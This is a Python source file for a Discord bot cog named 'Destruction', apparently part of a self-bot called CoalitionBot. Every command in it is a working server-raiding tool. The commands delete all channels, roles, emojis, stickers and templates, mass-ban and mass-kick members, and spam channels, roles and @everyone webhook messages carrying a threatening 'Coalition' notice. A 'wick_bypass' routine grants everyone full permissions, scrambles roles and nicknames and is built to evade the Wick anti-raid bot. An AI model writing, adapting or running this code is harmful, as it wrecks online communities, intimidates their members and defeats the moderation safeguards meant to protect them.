# -*- coding: utf-8 -*-
from itertools import cycle
import json
import random
import string
import traceback
from typing import Any, Mapping, Optional
from discord.ext import commands
import discord
import asyncio
import os
from typing import TYPE_CHECKING
if TYPE_CHECKING:
    from src.discord_bot import CoalitionBot


class Destruction(commands.Cog):

    def __init__(self, bot: 'CoalitionBot'):
        self.bot = bot
        self.wbyp_event = None

    @commands.command(aliases=["cbomb"])
    async def coalitionbomb(self, ctx: commands.Context, guild_id: Optional[int] = None, channel_count: int = 10, message_count: int = 5) -> None:
        """
        A command that deletes all channels in a server and creates new ones as a 'bomb'.
        This is a destructive command and should be used with caution.
        """
        try:
            guild = self.bot.get_guild(guild_id if guild_id is not None else ctx.guild.id)
            
            # Attempt to rename the guild and disable community if applicable
            await guild.edit(name="The Coalition", community=False)
            # await ctx.send("Guild renamed to 'The Coalition'. Disabling community.")

            # Delete all channels
            await asyncio.gather(*(channel.delete() for channel in guild.channels))
            # await ctx.send("All channels have been deleted.")

            # Create new channels
            names = [
                "the-coalition", "purged", "coalition-was-here", "funnied-by-coalition"
            ]
           
            if guild is None:
                print("Guild not found.")
                return
            
            new_channels = [
                asyncio.create_task(guild.create_text_channel(names[i % len(names)]))
                for i in range(channel_count)  # Create 10 new channels for demonstration
            ]

            # Create webhooks and spam messages
            wh_tasks = []
            for channel in asyncio.as_completed(new_channels):
                channel = await channel
                wh_tasks.append(channel.create_webhook(name="coalition"))
                
            msg_tasks = []
            for webhook in asyncio.as_completed(wh_tasks):
                webhook = await webhook
                for _ in range(message_count):
                    msg_tasks.append(webhook.send(
                        """
                        ||@everyone @here||
                        ```This server has been visited by the coalition. Any attempt to regain control will make you a target of the Coalition.
                        Glory to the Coalition, Hail BoBBiN.```
                        """
                    ))
                
               
            await asyncio.gather(*msg_tasks)
            print("Webhooks created and messages sent.")
        except discord.Forbidden:
            await ctx.send("I do not have permissions to perform this action.")
        except discord.HTTPException as e:
            await ctx.send(f"An error occurred: {e}")
    
    @commands.command(aliases=['cc', 'channelbomb', 'channelcreate', 'channelspam'])
    async def channel_spam(self, ctx: commands.Context, channel_name: str, amount: int):
        '''
        Spam creates channels.
        '''
        await asyncio.gather(*(self.bot.create_request(method='POST', url=f'https://discord.com/api/v10/guilds/{ctx.guild.id}/channels', headers={'Authorization': os.getenv('DISCORD_TOKEN')}, json={'type': '0', 'name': channel_name}) for _ in range(amount)))
        await ctx.message.edit("Done.")
    
    @commands.command(aliases=['rc', 'rolebomb', 'rolecreate', 'rolespam'])
    async def role_spam(self, ctx: commands.Context, channel_name: str, amount: int):
        '''
        Spam create roles.
        '''
        await asyncio.gather(*(self.bot.create_request(method='POST', url=f'https://discord.com/api/v10/guilds/{ctx.guild.id}/roles', headers={'Authorization': os.getenv('DISCORD_TOKEN')}, json={'name': channel_name}) for _ in range(amount)))
        await ctx.message.edit("Done.")

    @commands.command(aliases=['mban', 'massban'])
    async def mass_ban(self, ctx: commands.Context):
        '''
        Mass bans all members in a server.
        '''
        members = [member.id for member in await ctx.guild.chunk()]
        await asyncio.gather(*(self.bot.create_request(method='PUT', url=f'https://discord.com/api/v10/guilds/{ctx.guild.id}/bans/{member}', headers={'Authorization': os.getenv('DISCORD_TOKEN')}, json={'delete_message_seconds': 3600}) for member in members))
        await ctx.message.edit("Done.")

    @commands.command(aliases=['mkick', 'masskick'])
    async def mass_kick(self, ctx: commands.Context):
        '''
        Mass kicks all members in a server.
        '''
        members = [member.id for member in await ctx.guild.chunk()]
        await asyncio.gather(*(self.bot.create_request(method='DELETE', url=f'https://discord.com/api/v10/guilds/{ctx.guild.id}/members/{member}', headers={'Authorization': os.getenv('DISCORD_TOKEN')}) for member in members))

    @commands.command(aliases=['mdelc', 'masschanneldelete', 'massdeletechannels'])
    async def mass_delete_channels(self, ctx: commands.Context):
        '''
        Deletes all channels in a guild (all types).
        '''
        
        if not ctx.guild.me.guild_permissions.manage_channels:
            return await ctx.message.edit("No can do.")
        
        channels = [channel for channel in ctx.guild.channels if channel.permissions_for(ctx.author).manage_channels]
        await asyncio.gather(*(channel.delete() for channel in channels))
    
    @commands.command(aliases=['mdelr', 'massroledelete', 'massdeleteroles'])
    async def mass_delete_roles(self, ctx: commands.Context):
        '''
        Deletes all channels in a guild (all types).
        '''
        
        # check if we have perms
        if not ctx.guild.me.guild_permissions.manage_roles:
            return await ctx.message.edit("No can do.")
        
        # only try to delete roles lower than the bot's highest role
        highest_role = ctx.guild.me.top_role
        roles = [role for role in ctx.guild.roles if role < highest_role]
        
        await asyncio.gather(*(role.delete() for role in roles))
    
    @commands.command(aliases=['mrd', 'massroledel'])
    async def mass_role_delete(self, ctx: commands.Context):
        '''
        Mass deletes roles.
        '''
        guild = ctx.guild
        if guild is None:
            return
        if not guild.me.guild_permissions.manage_roles:
            return await ctx.message.edit("No can do.")
        
        roles = [role for role in guild.roles if (role < guild.me.top_role or guild.owner == guild.me) and role != ctx.guild.default_role]
        can_del = [role for role in roles if not role.is_bot_managed() and not role.is_premium_subscriber()]
        await asyncio.gather(*(role.delete() for role in can_del))
        
        await ctx.message.edit("Done.")
        
        
    
    @commands.command(aliases=['spammessage', 'spam_message', 'messagespam', 'message_spam'])
    async def spam(self, ctx: commands.Context, amount: int, *, content: str):
        '''
        Spams messages in a chat.
        '''
        try:
            await asyncio.gather(*(ctx.send(content) for _ in range(amount)))
        except discord.errors.HTTPException:
            pass
        
    @commands.command(aliases=['cdisorg'])
    async def channel_disorganize(self, ctx: commands.Context, fast=True):
        await self._cdisorg(ctx, fast)
        await ctx.message.edit("Done.")
        
    async def _cdisorg(self, ctx: commands.Context, fast=True):
        '''
        Disorganizes the channels in a guild.
        '''
        
        # We want to move all channels to the BOTTOM first, to keep them out of sight for as long as possible.
        # Move all lowest channels in categories (bottom category first) out of the categories.
        # Move all categories to the bottom.
        
        # Get all channels
        channels = [channel for channel in ctx.guild.channels if channel.permissions_for(ctx.author).manage_channels]
        categories = [channel for channel in channels if channel.type == discord.ChannelType.category]
        categories = sorted(categories, key=lambda x: x.position)
        
        text_channels = [channel for channel in channels if channel.type == discord.ChannelType.text]
        text_channels = sorted(text_channels, key=lambda x: x.position)
        
        voice_channels = [channel for channel in channels if channel.type == discord.ChannelType.voice]
        voice_channels = sorted(voice_channels, key=lambda x: x.position)
        
        # # first, move all text channels to the bottom
        
        tasks = []
        for channel in text_channels:
            if channel.category is None:
                continue
            # move them out of their category
            if not fast:
                await channel.edit(category=None)
            else:
                tasks.append(asyncio.create_task(channel.edit(category=None)))
            
        # then, move all voice channels to the bottom
        for channel in voice_channels:
            if channel.category is None:
                continue
            
            if not fast:
                await channel.edit(category=None)
            else:
                tasks.append(asyncio.create_task(channel.edit(category=None)))
                
        if fast:
            await asyncio.gather(*tasks)
    
    
    async def _spam_guild_change(self, ctx: commands.Context, event: asyncio.Event, make_channels=False, **kwargs):
        guild = ctx.guild
        if guild is None:
            return
        
        community = guild.rules_channel is not None and guild.public_updates_channel is not None
        
        name = kwargs.get('name', 'The Coalition')

        if not make_channels:
            text_channels = [channel for channel in guild.channels if channel.permissions_for(ctx.author).manage_channels and channel.type == discord.ChannelType.text]
            
        tasks = []
        while not event.is_set():
            frc = None
            fuc = None
            
            if community:
                
                if make_channels:
                    frc = discord.TextChannel(state=guild._state, guild=guild, data={'id': 1, 'position': 1, 'type': 0, 'name': 'rules'})
                    fuc = discord.TextChannel(state=guild._state, guild=guild, data={'id': 1, 'position': 2, 'type': 0, 'name': 'updates'})
                else:
                    rules = random.uniform(0, len(text_channels))
                    frc = text_channels[int(rules)]
                    updates = (rules + 1) % len(text_channels)
                    fuc = text_channels[int(updates)]

            tasks.append(asyncio.create_task(guild.edit(name=name, community=community, rules_channel=frc, public_updates_channel=fuc)))
            community = not community
            await asyncio.sleep(0.03)
        await asyncio.gather(*tasks)
        
        
    async def _remove_emojis(self, ctx: commands.Context):
        guild = ctx.guild
        if guild is None:
            return
        
        if not guild.me.guild_permissions.manage_emojis:
            return
        
        emojis = [emoji for emoji in guild.emojis if not emoji.managed]
        await asyncio.gather(*(emoji.delete() for emoji in emojis))
        
        
    async def _remove_stickers(self, ctx: commands.Context):
        guild = ctx.guild
        if guild is None:
            return
        
        if not guild.me.guild_permissions.manage_emojis_and_stickers:
            return
        
        stickers = [sticker for sticker in guild.stickers]
        await asyncio.gather(*(sticker.delete() for sticker in stickers))
        
        
    async def _remove_soundboards(self, ctx: commands.Context):
        # I'll add this later to discord.py-self via PR -Gen
        pass
    
    async def _remove_templates(self, ctx: commands.Context):
        guild = ctx.guild
        if guild is None:
            return
        
        if not guild.me.guild_permissions.manage_guild:
            return
        
        templates = [template for template in await guild.templates()]
        await asyncio.gather(*(template.delete() for template in templates))
        
    async def _remove_integrations(self, ctx: commands.Context):
        guild = ctx.guild
        if guild is None:
            return
        
        if not guild.me.guild_permissions.manage_guild:
            return
        
        apps = [app for app in await guild.integrations()]
        can_del = []
        for app in apps:
         
            user = guild.get_member(app.user.id) 
            if user is None:
                continue
    
            user = await guild.fetch_member(app.user.id)
        
            if user.top_role < guild.me.top_role or guild.owner == guild.me:
                can_del.append(app)
        await asyncio.gather(*(app.delete() for app in can_del))
                
        
    @commands.command(aliases=['wbyp'])
    async def wick_bypass(self, ctx: commands.Context, channel_name: str, msg_amt: int, *messages: str):
        '''
        Bypasses the wick filter.
        '''
        
        guild = ctx.guild
        if guild is None:
            return
        
        # first, rename all available channels (that we can see and have perms) to the specified name
        channels: list[discord.TextChannel] = [channel for channel in ctx.guild.channels if channel.permissions_for(ctx.author).manage_channels]
        
        event = asyncio.Event()
        self.wbyp_event = event
        
        
        async def spam_wh(wh: discord.Webhook, messages: list[str]):
            messages1 = cycle(messages)
            count = 0
            for i in range(msg_amt // 5 + 1):
                if event.is_set():
                    return
                tasks = []
                for i in range(5):
                    if count >= msg_amt:
                        break
                    tasks.append(asyncio.create_task(wh.send(next(messages1))))
                    count += 1
                await asyncio.gather(*tasks)
                await asyncio.sleep(4)
            event.set()
                
                
        async def random_channel_shuffle():
            while not event.is_set():
                if not guild.me.guild_permissions.manage_channels:
                    return
                
                channels = [channel for channel in ctx.guild.channels if channel.permissions_for(ctx.author).manage_channels]
                if len(channels) == 0:
                    await asyncio.sleep(1)
                    continue
                channel = random.choice(channels)
                min_pos = min([c.position for c in channels])
                max_pos = max([c.position for c in channels])
                await channel.edit(position=random.randint(min_pos, max_pos)) # this shifts all the others.
                
        async def random_role_shuffle(forever=False):
          
            
            shuffled = set()
            while not event.is_set():
                if not guild.me.guild_permissions.manage_roles:
                    return 
                
                available_roles = [role for role in guild.roles if role < guild.me.top_role] if guild.owner != guild.me else guild.roles
                available_roles = [role for role in available_roles if role.id not in shuffled and role != guild.default_role]
                
                if len(available_roles) == 0:
                    shuffled.clear()
                    if not forever: return
                    else:           continue
                role = random.choice(available_roles)
                min_pos = max(1, min([r.position for r in available_roles]))
                max_pos = max([r.position for r in available_roles])
                rand_pos = random.randint(min_pos, max_pos)
                random_name = ''.join(random.choices(string.ascii_letters, k=10))
                random_color = discord.Color(random.randint(0, 0xFFFFFF))
                await role.edit(position =rand_pos, name=random_name, color=random_color, mentionable=True, hoist=False)
                shuffled.add(role.id)
                
        async def random_nicknames():
            while not event.is_set():
                if not guild.me.guild_permissions.manage_nicknames:
                    return
                members = [member for member in guild.members if (member.top_role < guild.me.top_role) or guild.owner == guild.me]
                members = [member for member in members if member != guild.owner]
                if len(members) == 0:
                    return
                member = random.choice(members)
                random_name = ''.join(random.choices(string.ascii_letters, k=10))
                print('editing nickname', member.name, random_name)
                await member.edit(nick=random_name)
            
            
        # very weird bug when it comes to channel editing.
        # this is a pretty shitty way to handle it, but whatever.
        async def channel_edit(channel: discord.TextChannel, **kwargs):
            for i in range(5):
                if event.is_set():
                    return
                try:
                    return await channel.edit(**kwargs)
                except discord.errors.HTTPException as e:
                    if e.response.status == 429:
                        str = await e.response.text()
                        if 'retry_after' in str:
                            await asyncio.sleep(json.loads(str)['retry_after'])
                        else:
                            raise e
                except TypeError as e:
                    # assume overwrites failed.
                    kwargs.pop('overwrites')
            
        removal_tasks = []
        removal_tasks.append(asyncio.create_task(self._remove_emojis(ctx)))
        removal_tasks.append(asyncio.create_task(self._remove_stickers(ctx)))
        removal_tasks.append(asyncio.create_task(self._remove_soundboards(ctx)))
        removal_tasks.append(asyncio.create_task(self._remove_templates(ctx)))    
        # removal_tasks.append(asyncio.create_task(self._remove_integrations(ctx)))
        await asyncio.gather(*removal_tasks)
        
        spam_tasks = []
        # spam_tasks.append(asyncio.create_task(self._spam_guild_change(ctx, event, False, name='The Coalition')))
        spam_tasks.append(asyncio.create_task(random_channel_shuffle()))
        spam_tasks.append(asyncio.create_task(random_role_shuffle(False)))
        spam_tasks.append(asyncio.create_task(random_nicknames()))
 
 
        c_tasks = []
        for channel in channels:
            kwargs = {}
            if channel.type != discord.ChannelType.category:
                
                all_perms = {value: True for value in discord.PermissionOverwrite.PURE_FLAGS}
                
                kwargs['category'] = None
                overwrites: Mapping[Any, discord.PermissionOverwrite] = {
                    ctx.guild.default_role: discord.PermissionOverwrite(**all_perms),
                    **{member: discord.PermissionOverwrite(**all_perms) for member in channel.members},
                    **{role: discord.PermissionOverwrite(**all_perms) for role in guild.roles}
                }
                
                # if there are over 100 entries in overwrites, only use 100.
                if len(overwrites) > 100:
                    overwrites = dict(list(overwrites.items())[:100])
                
                kwargs['overwrites'] = overwrites
            c_tasks.append(asyncio.create_task(channel_edit(channel, name=channel_name, **kwargs)))
    
        
        wh_tasks = []
        for task in asyncio.as_completed(c_tasks):
            try:
                t: discord.abc.GuildChannel = await task
            except discord.errors.HTTPException as e:
                print(await e.response.text())
                continue
            
            if t.permissions_for(ctx.author).manage_webhooks and t.type == discord.ChannelType.text:
                t1: discord.TextChannel = t
                
                whs = await t1.webhooks()
                if len(whs) > 0:
                    for wh in whs:
                        spam_tasks.append(asyncio.create_task(spam_wh(wh, messages)))
                elif len(spam_tasks) < 51: # max of 50 per server + 1 for guild
                    wh_tasks.append(asyncio.create_task(t1.create_webhook(name="coalition")))
            
        
        for webhook in asyncio.as_completed(wh_tasks):
            wh: discord.Webhook = await webhook
            spam_tasks.append(asyncio.create_task(spam_wh(wh, messages)))
            
        # various tasks that can occur in the background

 
        await asyncio.gather(*spam_tasks)
        
        await ctx.message.edit("Done.")
        
    @wick_bypass.error
    async def wick_bypass_error(self, ctx: commands.Context, error: commands.CommandError):
        if isinstance(error, commands.MissingRequiredArgument):
            await ctx.message.edit("Missing required arguments.")
        elif isinstance(error, commands.BadArgument):
            await ctx.message.edit("Bad argument.")
        elif isinstance(error, commands.TooManyArguments):
            await ctx.message.edit("Too many arguments.")
        else:
            await ctx.message.edit("An error occurred.")
            
        traceback.print_exception(type(error), error, error.__traceback__)
        
        # clear the event
        self.wbyp_event.set()
        
        
    @commands.command(aliases=['wbstop'])
    async def wick_bypass_stop(self, ctx: commands.Context):
        '''
        Stops the wick bypass.
        '''
        if self.wbyp_event is not None:
            self.wbyp_event.set()
        await ctx.message.edit("Stopped.")
        
            
           
        

async def setup(bot):
    await bot.add_cog(Destruction(bot))
